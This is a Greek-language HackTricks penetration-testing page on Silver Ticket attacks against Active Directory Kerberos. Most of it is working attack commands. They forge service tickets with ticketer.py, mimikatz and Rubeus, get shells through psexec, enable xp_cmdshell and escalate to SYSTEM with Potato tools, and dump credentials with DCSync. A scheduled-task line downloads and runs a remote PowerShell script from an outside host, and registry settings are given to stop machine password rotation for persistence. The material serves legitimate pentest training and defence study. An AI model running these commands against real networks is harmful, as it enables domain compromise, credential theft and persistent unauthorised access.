# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Η επίθεση Silver Ticket περιλαμβάνει την εκμετάλλευση των service tickets σε περιβάλλοντα Active Directory (AD). Αυτή η μέθοδος βασίζεται στην απόκτηση του NTLM hash ενός service account, όπως ενός computer account, για να πλαστογραφηθεί ένα Ticket Granting Service (TGS) ticket. Με αυτό το παραποιημένο ticket, ένας attacker μπορεί να αποκτήσει πρόσβαση σε συγκεκριμένες υπηρεσίες στο δίκτυο, υποδυόμενος οποιονδήποτε χρήστη, συνήθως στοχεύοντας σε δικαιώματα διαχειριστή. Επισημαίνεται ότι η χρήση AES keys για την παραποίηση tickets είναι πιο ασφαλής και λιγότερο εντοπίσιμη.

> [!WARNING]
> Silver Tickets είναι λιγότερο εντοπίσιμα από Golden Tickets επειδή απαιτούν μόνο το **hash του service account**, όχι το krbtgt account. Ωστόσο, είναι περιορισμένα στην συγκεκριμένη υπηρεσία που στοχεύουν. Επιπλέον, αρκεί η κλοπή του password ενός χρήστη.
> Επιπλέον, αν συμβιβάσετε το **account's password with a SPN** μπορείτε να χρησιμοποιήσετε αυτό το password για να δημιουργήσετε ένα Silver Ticket που θα υποδύεται οποιονδήποτε χρήστη για εκείνη την υπηρεσία.

For ticket crafting, different tools are employed based on the operating system:

### Σε Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Σε Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Η υπηρεσία CIFS επισημαίνεται ως συνηθισμένος στόχος για πρόσβαση στο σύστημα αρχείων του θύματος, αλλά άλλες υπηρεσίες όπως HOST και RPCSS μπορούν επίσης να εκμεταλλευτούν για εργασίες και ερωτήματα WMI.

### Παράδειγμα: MSSQL υπηρεσία (MSSQLSvc) + Potato to SYSTEM

Εάν έχετε το NTLM hash (ή το AES key) ενός SQL service account (π.χ., sqlsvc), μπορείτε να forge ένα TGS για το MSSQL SPN και να impersonate οποιονδήποτε χρήστη προς την SQL service. Από εκεί, ενεργοποιήστε το xp_cmdshell για να εκτελέσετε εντολές ως ο SQL service account. Εάν αυτό το token έχει SeImpersonatePrivilege, chain ένα Potato για να elevate σε SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Εάν το προκύπτον πλαίσιο έχει SeImpersonatePrivilege (συνήθως ισχύει για τους λογαριασμούς υπηρεσίας), χρησιμοποιήστε μια παραλλαγή Potato για να αποκτήσετε SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Περισσότερες λεπτομέρειες για την εκμετάλλευση του MSSQL και την ενεργοποίηση του xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Επισκόπηση τεχνικών Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Διαθέσιμες Υπηρεσίες

| Τύπος Υπηρεσίας                           | Silver Tickets Υπηρεσίας                                                  |
| ---------------------------------------- | ------------------------------------------------------------------------- |
| WMI                                      | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                      | <p>HOST</p><p>HTTP</p><p>Ανάλογα με το λειτουργικό σύστημα επίσης:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                    | <p>HOST</p><p>HTTP</p><p>Σε ορισμένες περιπτώσεις μπορείτε απλά να ζητήσετε: WINRM</p> |
| Scheduled Tasks                          | HOST                                                                       |
| Windows File Share, also psexec          | CIFS                                                                       |
| LDAP operations, included DCSync         | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                           | krbtgt                                                                     |

Using **Rubeus** you may **ask for all** these tickets using the parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Σύνδεση λογαριασμού
- 4634: Αποσύνδεση λογαριασμού
- 4672: Σύνδεση διαχειριστή

## Επιμονή

To avoid machines from rotating their password every 30 days set  `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` or you could set `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` to a bigger value than 30days to indicate the rotation perdiod when the machines password should be rotated.

## Εκμετάλλευση Service tickets

Στα παρακάτω παραδείγματα ας υποθέσουμε ότι το ticket αποκτήθηκε μιμούμενο τον λογαριασμό διαχειριστή.

### CIFS

With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Θα μπορείτε επίσης να αποκτήσετε ένα shell μέσα στον host ή να εκτελέσετε αυθαίρετες εντολές χρησιμοποιώντας **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Με αυτή την άδεια μπορείτε να δημιουργήσετε scheduled tasks σε απομακρυσμένους υπολογιστές και να εκτελέσετε αυθαίρετες εντολές:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Με αυτά τα tickets μπορείτε να **εκτελέσετε WMI στο σύστημα του θύματος**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Βρείτε **περισσότερες πληροφορίες για wmiexec** στην παρακάτω σελίδα:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Με πρόσβαση σε winrm σε έναν υπολογιστή μπορείτε να **έχετε πρόσβαση σε αυτόν** και ακόμη να αποκτήσετε PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Check the following page to learn **more ways to connect with a remote host using winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Σημειώστε ότι **το winrm πρέπει να είναι ενεργό και να ακούει** στον απομακρυσμένο υπολογιστή για να είναι προσβάσιμο.

### LDAP

Με αυτό το προνόμιο μπορείτε να dump τη βάση δεδομένων του DC χρησιμοποιώντας το **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Μάθετε περισσότερα για το DCSync** στην παρακάτω σελίδα:


{{#ref}}
dcsync.md
{{#endref}}


## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
